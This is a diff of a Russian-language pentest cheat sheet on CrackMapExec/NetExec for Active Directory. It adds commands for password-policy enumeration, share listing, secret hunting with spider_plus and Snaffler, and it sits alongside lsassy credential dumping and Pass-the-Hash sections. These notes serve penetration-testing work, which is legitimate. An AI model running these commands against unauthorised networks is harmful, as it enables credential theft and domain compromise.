@@ -1,4 +1,4 @@
-		#tool #windows #framework #AD #multy
+#tool #windows #framework #AD #multy
 
 CME - это фреймворк для управления компрометацией AD
 CME позволяет работать сразу с множеством модулей и протоколов
@@ -15,8 +15,19 @@ CME позволяет работать сразу с множеством мо�
 ### Эксплуатация
 
 #### 1) Проверка учетной записи
+
+перечислить политику паролей 
+```bash
+crackmapexec smb <ip> -u <user> -p <password> --pass-pol
+```
+
 ```bash
 crackmapexec smb <ip> -u <user> -p <password>
+```
+
+проверить доступные шары
+```bash
+nxc smb <ip> -u <user> -p <password> --shares
 ```
 
 #### 2) Pass-the-Hash
@@ -65,7 +76,15 @@ crackmapexec smb <ip> -u <user> -p <password> -M lsassy
 ```bash
 crackmapexec smb <ip> -u <user> -p <password> -M gpp_autologin
 ```
+- spider_plus (Аналог Snaffler: поиск любых упоминаний секретов)
+```bash
+nxc smb <IP> -u <user> -p <pass> -M spider_plus
+```
 
+- Snaffler.exe
+```powershell
+.\Snaffler.exe  -d <domain> -s -v data
+```
 #### 5) LDAP Recon
 ```bash
 crackmapexec ldap <dc_ip> -u <user> -p <pass> --groups --users --computers
